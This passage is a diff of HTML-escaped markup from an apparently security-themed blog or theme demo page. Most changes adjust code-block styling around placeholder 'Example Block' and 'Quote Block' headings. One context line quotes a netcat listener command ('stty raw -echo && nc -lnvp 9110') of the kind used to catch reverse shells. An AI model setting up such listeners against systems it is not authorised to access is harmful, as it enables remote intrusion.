+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;0&lt;/span&gt;;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;example-block&#34; &gt;Example Block
 &lt;span&gt;
@@ -479,7 +706,7 @@ what stty raw -echo &amp;amp;&amp;amp; nc -lnvp 9110&lt;/p&gt;
         &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
     &lt;/a&gt;
 &lt;/span&gt;
-&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In This example will be going straight forward \Leftarrow
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In This example will be going straight forward \Leftarrow
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;quote-block&#34; &gt;Quote Block
 &lt;span&gt;
     &lt;a href=&#34;#quote-block&#34;&gt;
